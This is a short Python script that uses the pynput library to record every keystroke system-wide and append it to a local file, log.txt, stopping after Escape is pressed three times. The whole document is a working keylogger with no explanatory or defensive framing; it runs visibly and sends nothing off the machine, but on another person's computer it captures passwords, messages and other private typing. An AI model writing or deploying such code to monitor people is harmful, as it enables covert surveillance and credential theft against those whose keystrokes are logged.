#! python3
#! /usr/bin/python3
from pynput import keyboard

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
def on_press(key):
    try:
        with open('log.txt', 'a', encoding='utf-8') as file:
            text = f'{key.char}'
            file.write(text)
    except AttributeError:
        with open('log.txt', 'a', encoding='utf-8') as file:
            text = f'|{key}|'
            file.write(text)

def on_release(key):
    if key == keyboard.Key.esc:
        global count
        count += 1
        print(f'escape detected! {count}')
    if count ==  2:
        print('\033[1;31mIf you press esc again, the program will exit!\033[0;0m')
    elif count == 3:
        return False

if __name__ == '__main__':
    count = 0
    main()
